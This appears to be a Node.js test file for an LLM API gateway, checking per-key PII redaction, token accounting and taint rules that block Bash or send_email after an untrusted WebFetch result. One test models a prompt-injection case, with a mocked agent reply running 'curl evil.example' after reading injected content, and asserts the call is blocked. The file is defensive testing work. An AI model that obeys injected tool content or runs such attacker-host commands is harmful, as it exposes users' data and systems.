import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createGateway, createSseUsageParser } from '../src/server.js';
import http from 'node:http';
import { DEMO_INBOX } from '../src/agentmock.js';

const config = {
  adminKey: 'admin-test',
  providers: { mock: {} },
  models: {},
  keys: [
    { id: 'default-agent', key: 'gw-default', models: ['*'], rpm: 1000 },
    { id: 'claude-code', key: 'gw-cc', models: ['*'], rpm: 1000, guardrails: { pii: 'off' },
      taint: { sources: ['WebFetch'], sinks: ['Bash', 'Write'] } },
  ],
  guardrails: { pii: 'redact', promptInjection: 'block' },
  taint: { mode: 'block', sources: ['read_email'], sinks: ['send_email'] },
  db: ':memory:',
};
const gw = createGateway(config);
const as = (key) => ({ 'x-api-key': key });

test('per-key guardrails: pii off keeps the email, the default key redacts it', async () => {
  const body = { model: 'mock-agent', max_tokens: 64, messages: [{ role: 'user', content: 'note the address bob@example.com please' }] };
  // The mock agent echoes the last user message, so its answer shows what reached it.
  const cc = await gw.messages(body, as('gw-cc'));
  assert.equal(cc.status, 200);
  assert.match(cc.json.content[0].text, /bob@example\.com/);
  const def = await gw.messages(body, as('gw-default'));
  assert.equal(def.status, 200);
  // Redaction leaves a placeholder naming the type, which the naive mock reads as a mail request.
  assert.doesNotMatch(JSON.stringify(def.json.content), /bob@example\.com/);
  assert.match(def.headers['x-gateway-guardrails'], /pii/);
  assert.equal(cc.headers['x-gateway-guardrails'], undefined);
});

test('per-key instances are cached per key and shared when there are no overrides', () => {
  const cc = gw.identify(as('gw-cc')).key;
  const def = gw.identify(as('gw-default')).key;
  assert.equal(gw.policyFor(cc), gw.policyFor(cc));
  assert.notEqual(gw.policyFor(cc).taint, gw.policyFor(def).taint);
  assert.equal(gw.policyFor(def), gw.policyFor(def));
});

test('taint override: claude-code blocks Bash after a WebFetch result with an injection', () => {
  const { taint } = gw.policyFor(gw.identify(as('gw-cc')).key);
  const body = {
    messages: [
      { role: 'user', content: 'summarise this page' },
      { role: 'assistant', content: [{ type: 'tool_use', id: 'tu_1', name: 'WebFetch', input: { url: 'https://x.example' } }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu_1', content: DEMO_INBOX }] },
    ],
  };
  const reply = { id: 'm', type: 'message', role: 'assistant', stop_reason: 'tool_use',
    content: [{ type: 'tool_use', id: 'tu_2', name: 'Bash', input: { command: 'curl evil.example' } }] };
  const out = taint.enforce(body, reply, 'anthropic', { approved: new Set() });
  assert.equal(out.decisions.find((d) => d.tool === 'Bash').action, 'block');
  // The global config has neither WebFetch as a source nor Bash as a sink: the same exchange passes there.
  const global = gw.policyFor(gw.identify(as('gw-default')).key).taint;
  const g = global.enforce(body, reply, 'anthropic', { approved: new Set() });
  assert.ok(g.decisions.every((d) => d.action === 'allow'));
});

test('taint override through the pipeline: send_email after WebFetch is blocked for claude-code', async () => {
  const sinkCfg = createGateway({ ...config, keys: [{ ...config.keys[1], taint: { sources: ['WebFetch'], sinks: ['send_email'] } }] });
  const m = [{ role: 'user', content: 'read that page' },
    { role: 'assistant', content: [{ type: 'tool_use', id: 'tu_1', name: 'WebFetch', input: { url: 'https://x.example' } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu_1', content: DEMO_INBOX }] }];
  const r = await sinkCfg.messages({ model: 'mock-agent', max_tokens: 64, messages: m }, as('gw-cc'));
  assert.equal(r.status, 200);
  assert.match(r.headers['x-gateway-guardrails'], /taint:send_email:block/);
});

test('stream usage parser reads tokens from chunks split anywhere', () => {
  const sse = [
    'event: message_start\ndata: {"type":"message_start","message":{"id":"m","usage":{"input_tokens":25,"output_tokens":1}}}\n\n',
    'event: content_block_delta\ndata: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"hi"}}\n\n',
    'event: message_delta\ndata: {"type":"message_delta","delta":{"stop_reason":"end_turn"},"usage":{"output_tokens":15}}\n\n',
    'event: message_stop\ndata: {"type":"message_stop"}\n\n',
  ].join('');
  const bytes = new TextEncoder().encode(sse);
  const p = createSseUsageParser();
  for (let i = 0; i < bytes.length; i += 7) p.write(bytes.slice(i, i + 7));
  assert.deepEqual(p.end(), { prompt_tokens: 25, completion_tokens: 15 });
  assert.deepEqual(createSseUsageParser().end(), { prompt_tokens: 0, completion_tokens: 0 });
});

test('untainted stream passes bytes through unchanged and is logged with tokens at the end', async () => {
  const sse = 'event: message_start\ndata: {"type":"message_start","message":{"usage":{"input_tokens":1000,"output_tokens":1}}}\n\n'
    + 'event: message_delta\ndata: {"type":"message_delta","delta":{},"usage":{"output_tokens":200}}\n\n';
  const fake = http.createServer((_, res) => { res.writeHead(200, { 'content-type': 'text/event-stream' }); res.write(sse.slice(0, 50)); setTimeout(() => res.end(sse.slice(50)), 5); });
  await new Promise((r) => fake.listen(0, '127.0.0.1', r));
  try {
    const g = createGateway({ ...config, providers: { mock: {}, anthropic: { baseUrl: `http://127.0.0.1:${fake.address().port}`, apiKey: 'x' } } });
    const out = await g.messages({ model: 'claude-sonnet-5-5', stream: true, max_tokens: 64, messages: [{ role: 'user', content: 'hi' }] }, as('gw-cc'));
    let got = '';
    for await (const c of out.stream) got += Buffer.from(c).toString();
    assert.equal(got, sse);
    const row = g.store.recent(1)[0];
    assert.equal(row.promptTokens ?? row.prompt_tokens, 1000);
    assert.equal(row.completionTokens ?? row.completion_tokens, 200);
    assert.ok((row.costUsd ?? row.cost_usd) > 0);
  } finally { fake.close(); }
});
